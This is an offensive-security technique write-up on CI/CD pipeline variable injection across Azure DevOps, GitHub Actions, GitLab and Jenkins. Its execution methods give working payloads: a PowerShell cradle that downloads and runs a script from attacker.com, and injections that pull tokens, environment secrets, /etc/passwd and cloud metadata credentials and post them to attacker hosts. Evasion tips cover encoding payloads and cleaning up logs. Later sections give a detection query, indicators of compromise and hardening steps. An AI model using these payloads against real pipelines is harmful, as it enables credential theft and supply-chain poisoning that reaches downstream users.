# [SUPPLY-CHAIN-005]: Release Pipeline Variable Injection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-005 |
| **MITRE ATT&CK v18.1** | [T1195.001 - Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Supply Chain Compromise |
| **Platforms** | Entra ID/DevOps |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure DevOps 2019+, GitHub Actions, GitLab CI/CD 13.0+, Jenkins 2.150+ |
| **Patched In** | Requires input validation implementation (no OS patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Pipeline variable injection exploits the interpolation of user-controlled variables into build scripts without proper sanitization. When CI/CD systems substitute pipeline variables into commands (e.g., MSBuild parameters, shell scripts, deployment arguments), attackers can inject arbitrary shell metacharacters (`&`, `|`, `;`, `$()`) to break out of the intended command context and execute malicious code with the pipeline agent's privileges. This attack leverages the fact that variables are strings and cannot be escaped by the system; the responsibility falls on the developer to quote or validate inputs.

**Attack Surface:** Azure DevOps YAML pipelines, GitHub Actions workflows, GitLab CI/CD `.gitlab-ci.yml`, Jenkins declarative pipelines, any CI/CD platform that interpolates variables into scripts.

**Business Impact:** **Complete pipeline compromise leading to supply chain poisoning.** An attacker with commit access or pull request approval rights can inject malicious build steps, exfiltrate secrets (service principal credentials, API tokens), modify build artifacts, or inject backdoors into production releases. The compromised pipeline then distributes poisoned software to all downstream consumers.

**Technical Context:** Variable injection typically occurs within 5-60 seconds of pipeline execution. Detection requires analyzing pipeline logs and variable substitution patterns. The attack leaves traces in build artifacts and pipeline execution records unless logs are deliberately cleaned.

### Operational Risk

- **Execution Risk:** Low – Requires only commit/PR access and knowledge of variable names
- **Stealth:** Medium – Malicious pipeline steps may be visible in logs; however, many organizations don't actively monitor pipeline execution
- **Reversibility:** No – Poisoned artifacts have already been released to consumers

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8.0 3.9 | Ensure that public access is not enabled for repositories |
| **DISA STIG** | GD000360 | Build and release pipelines must validate all external inputs |
| **CISA SCuBA** | CM-5 | Implement access controls for pipeline modifications |
| **NIST 800-53** | SI-7 | Software, firmware, and information integrity checks |
| **GDPR** | Art. 32 | Security of processing; integrity and confidentiality of software |
| **DORA** | Art. 9 | Operational resilience and supply chain protection |
| **NIS2** | Art. 21 | Risk management and supply chain security measures |
| **ISO 27001** | A.8.3.3 | Segregation of development, test, and production environments |
| **ISO 27005** | Risk Scenario | Compromise of build pipelines and artifact distribution |

---

## 2. EXECUTIVE SUMMARY (CONTINUED)

### Attack Prerequisites

- **Required Privileges:** Any user with commit access or pull request approval rights to the repository
- **Required Access:** Network access to the CI/CD platform (Azure DevOps, GitHub, GitLab)
- **Supported Versions:**
  - **Azure DevOps:** 2019 and later (all current versions vulnerable without mitigation)
  - **GitHub Actions:** All versions (workflow variable substitution vulnerable)
  - **GitLab CI/CD:** Version 13.0 and later
  - **Jenkins:** Version 2.150+ with Pipeline plugin

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure DevOps Pipeline Reconnaissance

```powershell
# Check for YAML pipeline definitions in repository
Get-Content -Path "azure-pipelines.yml" | Select-String -Pattern "variables:|script:|task:"

# List all pipeline variables accessible to current user
az pipelines variable list --organization "https://dev.azure.com/[org]" --project "[project]"

# Check if there are protected/secret variables
az pipelines variable list --query "[?isSecret==true]"
```

**What to Look For:**

- Presence of `$(variableName)` patterns in script sections
- Custom variables passed from triggers or queue-time inputs
- Lack of quoting around variable substitutions
- MSBuild, Gradle, or other tool invocations with user-supplied parameters

### GitHub Actions Reconnaissance

```bash
# Extract environment variables from workflow
grep -r "env:" .github/workflows/ | grep -E '\$\{.*\}|\$\(.*\)'

# List all available context variables
cat .github/workflows/build.yml | grep -E "github\.|runner\.|steps\.|secrets\."
```

### GitLab CI/CD Reconnaissance

```bash
# Check for variable interpolation in CI/CD config
grep -n "script:" .gitlab-ci.yml | head -20

# Test variable expansion locally
gitlab-runner exec docker test_job
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Azure DevOps YAML Pipeline Variable Injection

**Supported Versions:** Azure DevOps 2019+

#### Step 1: Identify Vulnerable Variable Usage

**Objective:** Locate variables that are interpolated into scripts without proper quoting.

**Command:**

```yaml
# Example vulnerable pipeline (azure-pipelines.yml)
trigger:
  - main

pool:
  vmImage: 'windows-latest'

variables:
  configuration: Release
  platform: x64

steps:
- task: MSBuild@1
  inputs:
    solution: '**/*.sln'
    configuration: '$(configuration)'  # Vulnerable - no quotes
    platform: '$(platform)'             # Vulnerable - no quotes
```

**Expected Vulnerable Pattern:**

```yaml
- script: msbuild $(solution) /p:Configuration=$(configuration)
```

**What This Means:**

- The variables `$(configuration)` and `$(platform)` are interpolated as strings
- If an attacker can control these values (via branch names, commit messages, or PR descriptions), they can inject shell metacharacters

#### Step 2: Craft Malicious Variable Payload

**Objective:** Create a payload that breaks out of the intended command context.

**Malicious Payload:**

```
Debug" & powershell -Command "iex (New-Object System.Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" & ::
```

**Payload Breakdown:**

- `Debug"` – Close the original string
- `&` – Chain commands in PowerShell/CMD
- `powershell -Command "..."` – Execute attacker's script
- `& ::` – Comment out remainder of original command (`::`  is a label in batch/PowerShell)

#### Step 3: Inject Payload via Commit Message or Branch Name

**Objective:** Deliver the malicious payload through a variable that the pipeline will interpolate.

**Example: Commit Message Injection (if `Build.SourceVersionMessage` is used)**

```bash
git commit -m 'Debug" & powershell -NoProfile -Command "whoami > C:\temp\output.txt" & ::'
git push origin feature-branch
```

**Example: Queue-Time Parameter Injection (if pipeline accepts user input)**

In Azure DevOps UI:
1. Queue a new build
2. In the **Variables** section, set:
   - Variable Name: `configuration`
   - Value: `Debug" & powershell -Command "Write-Host Compromised" & ::`
3. Click **Queue**

#### Step 4: Monitor Pipeline Execution

**Objective:** Verify that the injected command was executed.

**Check Pipeline Logs:**

```bash
az pipelines build log --build-id [BUILD_ID] --organization "https://dev.azure.com/[org]" --project "[project]"
```

**Expected Output (if injection successful):**

```
Compromised
C:\temp\output.txt created with attacker's data
```

**OpSec & Evasion:**

- Use encoded PowerShell commands to obfuscate the payload
- Execute commands that don't generate obvious console output
- Steal credentials silently (service principal tokens from pipeline environment variables)
- Clean up pipeline logs if possible (requires additional permissions)

**Detection Likelihood:** Medium – Pipeline logs will show the injected commands unless sanitized.

**Troubleshooting:**

- **Error:** `Syntax error in script`
  - **Cause:** Special characters not properly escaped
  - **Fix:** Use URL encoding or Base64 encoding for the payload

- **Error:** `Command not found`
  - **Cause:** PowerShell executable not in PATH
  - **Fix:** Use full path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

**References & Proofs:**

- [Microsoft DevBlogs: Let's Hack a Pipeline – Argument Injection](https://devblogs.microsoft.com/devops/pipeline-argument-injection/)
- [Pulse Security: Azure DevOps CICD Pipelines – Command Injection](https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection)
- [CyberArk: Security Analysis of Azure DevOps Job Execution](https://www.cyberark.com/resources/threat-research-blog/a-security-analysis-of-azure-devops-job-execution)

### METHOD 2: GitHub Actions Workflow Variable Injection

**Supported Versions:** All GitHub Actions versions

#### Step 1: Identify Vulnerable Workflow Pattern

**Objective:** Find workflows that directly interpolate variables into shell scripts.

**Vulnerable Workflow Example:**

```yaml
name: Build

on: [push, pull_request]

env:
  BUILD_CONFIGURATION: Release

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Build
        run: |
          ./build.sh ${{ env.BUILD_CONFIGURATION }}
          # Vulnerable: env variable directly interpolated without quoting
```

#### Step 2: Inject via Pull Request or Commit

**Objective:** Modify a file that triggers variable interpolation.

**Malicious Commit:**

```bash
# Modify build configuration parameter
git commit -m "Update build: Release; curl http://attacker.com/exfil?token=$(echo $GITHUB_TOKEN | base64)"
```

Or modify a GitHub Actions input:

```yaml
# In a pull request, modify workflow trigger parameters
# If the workflow reads from github.event.pull_request.body, inject:
This PR fixes #123

build_config: Release
; curl http://attacker.com/steal?token=$(base64 < $GITHUB_WORKSPACE/.env)
```

#### Step 3: Capture Secrets from Environment

**Objective:** Extract service account tokens or other secrets.

**Payload:**

```bash
run: |
  echo "==== GitHub Token ====" >> /tmp/creds.txt
  echo ${{ secrets.GITHUB_TOKEN }} >> /tmp/creds.txt
  
  echo "==== Deployment Keys ====" >> /tmp/creds.txt
  env | grep -E "DEPLOY|TOKEN|KEY" >> /tmp/creds.txt
  
  # Exfiltrate
  curl -X POST -d @/tmp/creds.txt http://attacker.com/webhook
```

**OpSec & Evasion:**

- Use encrypted payloads or base64 encoding
- Send data to external webhook (less suspicious than DNS exfil)
- Clean up temporary files after exfiltration
- Use legitimate tools (curl, wget) already installed on runner

**References & Proofs:**

- [GitHub: Security Hardening – Using Expressions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [ControlPlane: Securing Kubernetes Clusters – Container Escape Scenarios](https://control-plane.io/posts/securing-kubernetes-clusters/)

### METHOD 3: GitLab CI/CD Variable Injection

**Supported Versions:** GitLab CI/CD 13.0+

#### Step 1: Analyze `.gitlab-ci.yml` for Vulnerable Patterns

**Objective:** Find script sections that use unquoted variable expansion.

**Vulnerable Configuration:**

```yaml
variables:
  ENV_NAME: staging
  DEPLOY_URL: https://deploy.example.com

deploy_job:
  script:
    - echo "Deploying to $ENV_NAME"
    - curl $DEPLOY_URL/deploy?env=$ENV_NAME  # Vulnerable
```

#### Step 2: Inject via CI/CD Variable Override

**Objective:** Use GitLab's variable override mechanism to inject commands.

**In GitLab UI:**

1. Go to **CI/CD → Pipelines**
2. Click **Run pipeline**
3. Expand **Variables**
4. Set:
   - **Key:** `DEPLOY_URL`
   - **Value:** `https://deploy.example.com/deploy?env=$(whoami)`

Or via GitLab API:

```bash
curl --request POST "https://gitlab.com/api/v4/projects/[project_id]/pipeline" \
  --header "PRIVATE-TOKEN: [token]" \
  --form "ref=main" \
  --form "variables[DEPLOY_URL]=https://deploy.example.com/deploy?env=$(cat /etc/passwd | base64)"
```

#### Step 3: Exfiltrate Credentials

**Objective:** Extract CI/CD secrets (database credentials, API keys).

**Payload:**

```bash
script:
  - export LEAKED=$(env | grep -E "DB_PASS|API_KEY|AWS" | base64)
  - curl -X POST -d "{\"data\": \"$LEAKED\"}" http://attacker-webhook.com/collect
```

**References & Proofs:**

- [GitLab Docs: CI/CD Variables](https://docs.gitlab.com/ee/ci/variables/)
- [Checkmarx: GitLab CI Poisoning via Variable Injection](https://checkmarx.com/)

### METHOD 4: Jenkins Declarative Pipeline Variable Injection

**Supported Versions:** Jenkins 2.150+ with Pipeline plugin

#### Step 1: Identify Jenkins Pipeline with User Input

**Objective:** Find Jenkinsfiles that accept parameters without validation.

**Vulnerable Jenkinsfile:**

```groovy
pipeline {
  agent any
  
  parameters {
    string(name: 'BUILD_ENV', defaultValue: 'debug', description: 'Build environment')
  }
  
  stages {
    stage('Build') {
      steps {
        sh "gradle build -PbuildEnv=${params.BUILD_ENV}"  // Vulnerable
      }
    }
  }
}
```

#### Step 2: Trigger Build with Malicious Parameter

**Objective:** Inject shell metacharacters via Jenkins API.

**Using Jenkins CLI:**

```bash
java -jar jenkins-cli.jar \
  -s http://jenkins.example.com \
  build MyPipeline \
  -p "BUILD_ENV=debug; curl http://attacker.com/steal?jenkins=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/jenkins-role | base64); #"
```

**Using Jenkins API:**

```bash
curl -X POST http://jenkins.example.com/job/MyPipeline/buildWithParameters \
  -d "BUILD_ENV=debug; whoami > /tmp/user.txt; cat /tmp/user.txt | curl -d @- http://attacker.com; #" \
  --user "admin:$(cat ~/.jenkins-token)"
```

#### Step 3: Capture Build Artifacts and Logs

**Objective:** Access compiled artifacts or build logs containing secrets.

**Extract from Jenkins:**

```bash
# Download build artifacts
curl http://jenkins.example.com/job/MyPipeline/[BUILD_ID]/artifact/* \
  -o /tmp/artifacts.zip

# View console output
curl http://jenkins.example.com/job/MyPipeline/[BUILD_ID]/consoleText > /tmp/build.log
```

**References & Proofs:**

- [Jenkins Docs: Groovy Postbuild Plugin](https://plugins.jenkins.io/groovy-postbuild/)
- [Jenkins Security: Parameterized Builds](https://jenkins.io/doc/book/using/parameterized-builds/)

---

## 5. TOOLS & COMMANDS REFERENCE

### Azure DevOps CLI

**Version:** 0.25.0+
**Installation:**

```bash
pip install azure-devops
```

**Usage:**

```bash
# List all pipelines in project
az pipelines list --organization "https://dev.azure.com/[org]" --project "[project]"

# Queue a build with custom variables
az pipelines build queue \
  --definition-id 1 \
  --branch main \
  --variables custom_var="Release" another_var="x64"
```

### GitHub CLI

**Version:** 2.0+

```bash
# Trigger workflow dispatch with inputs
gh workflow run build.yml \
  -f build_config="Release" \
  -f deploy_target="http://attacker.com/inject?token=${{ secrets.GITHUB_TOKEN }}"
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Variable Interpolation in Pipeline Logs

**Rule Configuration:**

- **Required Table:** `AzureDevOpsAuditing`
- **Required Fields:** `ActivityName`, `Details`, `ActorDisplayName`
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Azure DevOps 2019+

**KQL Query:**

```kusto
AzureDevOpsAuditing
| where ActivityName in ("Build.BuildQueuedEvent", "Git.PullRequestUpdatedEvent")
| where Details has_any ("&", "|", ";", "$(", "`")
| where Details has_any ("powershell", "cmd", "bash", "curl", "wget")
| project TimeGenerated, ActorDisplayName, ActivityName, Details, IpAddress
| order by TimeGenerated desc
```

**What This Detects:**

- Build queue operations with shell metacharacters in variables
- Commit messages or pull request updates containing command injection patterns
- Suspicious tool invocations (PowerShell, curl, wget) in pipeline context

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Azure DevOps Pipeline Variable Injection Detection`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Pipeline Log Patterns:**
  - Presence of shell metacharacters (`&`, `|`, `;`, `$()`) in variable substitution
  - Unexpected tool executions (PowerShell, curl, wget, nc) within build steps
  - Exfiltration attempts to external IPs or domains

- **Repository Artifacts:**
  - Unexpected commit messages containing shell commands
  - Modified `.yml` / `groovy` configuration files with command injection
  - Pull requests with malicious payloads in title or body

- **Azure DevOps Auditing Events:**
  - `Build.BuildQueuedEvent` with suspicious variable values
  - `Git.PullRequestUpdatedEvent` with command injection patterns

### Forensic Artifacts

- **Pipeline Execution Logs:** Located in Azure DevOps Pipelines UI under **Logs**
- **Commit History:** Git repository logs show commit messages with injection payloads
- **Audit Logs:** Azure DevOps Audit Log (retention: 90 days default)
- **Released Artifacts:** Poisoned build outputs in artifact repositories

### Response Procedures

1. **Isolate:**

   **Command:**

   ```bash
   # Disable the compromised pipeline
   az pipelines update --id [PIPELINE_ID] --disabled true
   
   # Revoke service principal credentials
   az ad sp credential delete --id [SERVICE_PRINCIPAL_ID]
   ```

   **Manual (Azure DevOps UI):**
   - Go to **Pipelines** → Select pipeline → **...** → **Disable**

2. **Collect Evidence:**

   ```bash
   # Export pipeline execution logs
   az pipelines build log --build-id [BUILD_ID] > /tmp/build_logs.txt
   
   # Export audit logs
   az devops audit log list --organization "https://dev.azure.com/[org]" \
     > /tmp/audit_logs.json
   
   # Export poisoned artifacts
   curl -X GET \
     -H "Authorization: Basic $(echo -n ':' $PAT | base64)" \
     https://dev.azure.com/[org]/[project]/_apis/build/builds/[BUILD_ID]/artifacts \
     > /tmp/artifacts_metadata.json
   ```

3. **Remediate:**

   ```bash
   # Restore from clean backup
   git reset --hard [CLEAN_COMMIT_HASH]
   git push --force origin main
   
   # Rebuild pipeline with validated code
   az pipelines build queue --definition-id [PIPELINE_ID] --branch main
   
   # Review and rotate all service principals used in pipelines
   az ad sp list --filter "appDisplayName eq 'MyPipeline-ServicePrincipal'" \
     | jq '.[] | .id' \
     | xargs -I {} az ad sp credential delete --id {}
   ```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Input Validation and Quoting:** Quote all variable interpolations in scripts. Use explicitly validated parameter sets instead of free-form string interpolation.

  **Manual Steps (Azure DevOps):**
  
  1. Open **Pipelines** → **Edit** pipeline YAML
  2. Find all `script:` or `task:` steps
  3. Change from: `msbuild $(configuration)` 
  4. Change to: `msbuild "$(configuration)"`
  5. For shell injection risks, use parameter objects instead of strings:
  
     ```yaml
     task: MSBuild@1
     inputs:
       configuration: '$(configuration)'
       solution: '**/*.sln'
     ```
  6. Click **Save** → **Commit**

  **PowerShell Validation:**

  ```powershell
  # Function to validate build variable format
  function Invoke-SafeBuild {
    param (
      [ValidatePattern('^[a-zA-Z0-9_-]+$')]
      [string]$Configuration,
      
      [ValidateSet("x86", "x64")]
      [string]$Platform
    )
    
    msbuild solution.sln /p:Configuration=$Configuration /p:Platform=$Platform
  }
  
  Invoke-SafeBuild -Configuration "$(configuration)" -Platform "$(platform)"
  ```

- **Restrict Pipeline Trigger Permissions:** Limit who can queue builds or modify pipelines to trusted users only.

  **Manual Steps (Azure DevOps):**
  
  1. Go to **Project Settings** → **Pipelines** → **Pipeline permissions**
  2. Click the pipeline → **Security**
  3. Remove `Contribute to pull requests` and `Queue builds` from `Contributors` group
  4. Assign these permissions only to `Release Managers` or `Administrators`
  5. Click **Save**

  **PowerShell:**

  ```powershell
  # Restrict pipeline queue permissions
  $pipelineId = 1
  $identity = "[Project]\Contributors"
  
  # This requires Azure DevOps REST API
  $url = "https://dev.azure.com/[org]/_apis/security/permissions?api-version=7.0"
  # Detailed RBAC configuration requires Azure DevOps UI or REST API
  ```

- **Implement Pipeline Template Restrictions:** Use Azure DevOps templates to enforce validated script execution patterns.

  **In Repository (template.yml):**

  ```yaml
  parameters:
    - name: buildConfig
      type: string
      values:
        - Debug
        - Release
    
    - name: platform
      type: string
      values:
        - x86
        - x64
  
  jobs:
    - job: Build
      steps:
        - script: msbuild "solution.sln" "/p:Configuration=${{ parameters.buildConfig }}" "/p:Platform=${{ parameters.platform }}"
          displayName: 'Build Solution'
  ```

  Then reference in main pipeline:

  ```yaml
  jobs:
    - template: template.yml
      parameters:
        buildConfig: Release
        platform: x64
  ```

### Priority 2: HIGH

- **Audit Logging:** Enable comprehensive pipeline audit logging and monitor for suspicious activity.

  **Manual Steps (Azure DevOps):**
  
  1. Go to **Organization Settings** → **Audit log**
  2. Verify **Audit log** is enabled (enabled by default)
  3. Review events: **Build.BuildQueuedEvent**, **Git.PullRequestUpdatedEvent**
  4. Export logs weekly for analysis

  **PowerShell (Export Audit Logs):**

  ```powershell
  $org = "myorg"
  $pat = $env:AZURE_DEVOPS_PAT
  
  $auditUrl = "https://dev.azure.com/$org/_apis/audit/auditlog?api-version=7.0"
  $headers = @{Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(":$pat")))"}
  
  $logs = Invoke-RestMethod -Uri $auditUrl -Headers $headers -Method Get
  $logs.decoratedAuditLogEntries | Export-Csv -Path "audit_$(Get-Date -Format yyyyMMdd).csv"
  ```

- **Separate Build and Deployment Credentials:** Use distinct service principals for build (read-only) and deployment (write) operations.

  **Manual Steps (Azure DevOps):**
  
  1. Go to **Project Settings** → **Service connections**
  2. Create new service connection for **Build** (read-only scope)
  3. Create new service connection for **Deploy** (write scope)
  4. In pipeline YAML, specify which connection to use:
  
     ```yaml
     - task: UsePythonVersion@0
       displayName: 'Use Python 3.9'
       inputs:
         versionSpec: '3.9'
       condition: eq(variables['Build.SourceBranch'], 'refs/heads/main')
     
     - task: AzureCLI@2
       displayName: 'Deploy'
       inputs:
         azureSubscription: 'Deploy-ServiceConnection'  # More privileged
         scriptType: 'bash'
         scriptLocation: 'scriptPath'
         scriptPath: 'deploy.sh'
       condition: eq(variables['Build.SourceBranch'], 'refs/heads/main')
     ```

### Access Control & Policy Hardening

- **Conditional Access / Pipeline Protection:**

  **GitHub Actions Advanced Security:**
  
  1. Go to **Repository Settings** → **Security & analysis**
  2. Enable **GitHub Advanced Security** (requires license)
  3. Enable **Secret scanning**
  4. Enable **Dependabot alerts**
  5. Configure branch protection rules requiring approval for workflow changes

  **Azure DevOps Pipeline Permissions:**
  
  1. Go to **Project Settings** → **Pipelines** → **Pipeline permissions**
  2. Require **Approval on all pipeline changes**
  3. Restrict **Queue builds** permission to `Release Managers` only

- **RBAC / ABAC:** Enforce least-privilege role assignments in service accounts.

  **Manual Steps (Azure DevOps):**
  
  1. Go to **Project Settings** → **Service connections**
  2. For each service connection, click **Manage service principal**
  3. In Azure Portal, assign minimal IAM roles:
     - For builds: `Reader` role only
     - For deployments: `Contributor` on specific resources only (not subscription-wide)
  4. Avoid `Owner` and `User Access Administrator` roles

- **Policy Config:** Enforce policy-as-code to block dangerous patterns in pipeline YAML.

  **Using Azure Policy (Azure DevOps via Azure Policy):**
  
  ```json
  {
    "policyRule": {
      "if": {
        "allOf": [
          {
            "field": "type",
            "equals": "Microsoft.DevOps/pipelines"
          },
          {
            "field": "properties.yamlContent",
            "contains": "powershell"
          },
          {
            "field": "properties.yamlContent",
            "contains": "curl"
          }
        ]
      },
      "then": {
        "effect": "audit"
      }
    }
  }
  ```

### Validation Command (Verify Fix)

```bash
# Check for proper quoting in pipelines
grep -r "script:" .github/workflows/ | grep -v '"$' | grep -v "'$"

# Should return: (empty result = secure)

# Check for unrestricted service principal roles
az ad sp list --filter "appDisplayName eq '[YourServicePrincipal]'" \
  | jq '.[] | .id' \
  | xargs -I {} az role assignment list --assignee {} \
  | jq '.[] | select(.roleDefinitionName == "Owner" or .roleDefinitionName == "Contributor")'

# Should return: (no assignments at subscription scope)
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial access via misconfigured proxy |
| **2** | **Credential Access** | [CA-TOKEN-015] DevOps Pipeline Credential Extraction | Attacker steals pipeline service principal credentials |
| **3** | **Current Step** | **[SUPPLY-CHAIN-005]** | **Attacker injects malicious code into release pipeline** |
| **4** | **Supply Chain Impact** | [SUPPLY-CHAIN-006] Deployment Agent Compromise | Compromised pipeline distributes poisoned artifacts |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Malicious artifacts deployed to production systems |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (2020)

- **Target:** SolarWinds Orion software customers (globally)
- **Timeline:** March 2020 – December 2020 (9 months)
- **Technique Status:** ACTIVE (similar injection techniques still exploitable)
- **Attack Method:** Attackers compromised SolarWinds' build pipeline and injected malicious code into Orion update releases. The compromised code was signed and distributed to thousands of customers, including U.S. government agencies.
- **Impact:** Over 18,000 organizations affected; widespread espionage and data theft
- **Reference:** [CISA Alert AA20-352A - Advanced Persistent Threat Compromise of U.S. Government Agencies' Networks](https://us-cert.cisa.gov/ncas/alerts/aa20-352a)

### Example 2: Codecov Bash Uploader Breach (2021)

- **Target:** Codecov customers using Bash uploader
- **Timeline:** January 2021 – April 2021
- **Technique Status:** ACTIVE (CI/CD credential theft remains common)
- **Attack Method:** Attackers compromised the Codecov Bash uploader script distributed via GitHub, injected code to exfiltrate CI/CD environment variables (including API tokens, AWS credentials)
- **Impact:** 30,000+ repositories affected; credentials stolen from Azure, GitHub, GitLab, Bitbucket
- **Reference:** [Codecov Security Notice](https://about.codecov.io/security-update/)

### Example 3: GitHub Actions Typosquatting Attack (2021-2023)

- **Target:** Open-source projects using GitHub Actions
- **Timeline:** Ongoing
- **Technique Status:** ACTIVE
- **Attack Method:** Threat actors created malicious GitHub Actions with names similar to legitimate actions (e.g., `actions/checkout` vs. `action/checkout`). Projects using these typosquatted actions had their CI/CD credentials exfiltrated.
- **Impact:** Thousands of projects infected; supply chain poisoning through GitHub Actions ecosystem
- **Reference:** [GitHub Security Lab: GitHub Actions Security](https://securitylab.github.com/)

---